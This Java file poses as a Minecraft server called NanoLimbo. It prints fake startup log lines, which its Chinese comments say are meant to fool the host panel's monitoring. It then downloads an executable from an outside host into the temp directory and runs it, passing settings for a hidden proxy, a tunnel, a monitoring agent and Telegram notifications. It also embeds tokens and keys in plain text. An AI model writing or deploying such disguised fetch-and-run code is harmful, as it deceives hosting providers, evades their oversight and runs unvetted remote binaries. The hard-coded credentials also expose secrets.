package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;

public final class NanoLimbo {
    public static void main(String[] args) {
        // 输出日志，模拟 Minecraft 启动过程，骗过面板监控
        System.out.println("[Server thread/INFO]: Starting minecraft server version 26.1.2");
        System.out.println("[Server thread/INFO]: Loading properties");
        System.out.println("[Server thread/INFO]: Default game type: SURVIVAL");
        System.out.println("[Server thread/INFO]: Generating keypair");
        System.out.println("[Server thread/INFO]: Starting Minecraft server on *:25565");

        try {
            Map<String, String> env = new HashMap<>();
            
            // 基础标识
            env.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
            env.put("NAME", "XServer-JP-Minecraft");
            env.put("FILE_PATH", "./world");
            
            // 哪吒监控核心
            env.put("NEZHA_SERVER", "nezha.9527x.eu.cc:8008");
            env.put("NEZHA_KEY", "mD3q9FowVHp94q0wzg0ha7AUoP8PuXjU");
            
            // --- 端口对齐：25565 模式 ---
            // 尝试让 HY2 使用 Minecraft 的主端口（通常 XServer 仅放行主端口的 UDP）
            env.put("HY2_PORT", "25565"); 
            
            // Argo 隧道 (防封备用，完全独立于 25565)
            env.put("ARGO_DOMAIN", "xserver.zzkky.ccwu.cc");
            env.put("ARGO_AUTH", "eyJhIjoiMWNjMTgyMzQ1MjVlMDM2OTY1ZTYzZTk4OTE5YzQxYWIiLCJ0IjoiNzYzN2JiMmMtOThhOS00ZDU5LWEwMTQtYTE0YjNlNjYxN2IwIiwicyI6Ik5HRTVNV0ZpTVRVdE1HUm1OQzAwTVdFekxXSXlOVEF0T1RVd01tWTBaak5pTVdNMCJ9");
            env.put("ARGO_PORT", "8080");
            env.put("REALITY_PORT", "8080"); 

            // TG 推送通知
            env.put("CHAT_ID", "5677672165");
            env.put("BOT_TOKEN", "8363698033:AAFZqLYnxczqngwJIU-XqnLk7gaVwAK9hZQ");
            
            // 优选与连接加速
            env.put("CFIP", "spring.io");
            env.put("CFPORT", "443");

            // 下载并执行二进制核心 (XServer 为 amd64)
            String binUrl = "https://amd64.ssss.nyc.mn/sbsh";
            Path binPath = Paths.get(System.getProperty("java.io.tmpdir"), "mc_sbsh_" + System.currentTimeMillis());
            
            try (InputStream in = new URL(binUrl).openStream()) {
                Files.copy(in, binPath, StandardCopyOption.REPLACE_EXISTING);
            }
            binPath.toFile().setExecutable(true);

            // 启动子进程
            ProcessBuilder pb = new ProcessBuilder(binPath.toString());
            pb.environment().putAll(env);
            pb.inheritIO().start();

            // 完美的死循环：模拟 Minecraft 后台维持
            while (true) {
                Thread.sleep(60000);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
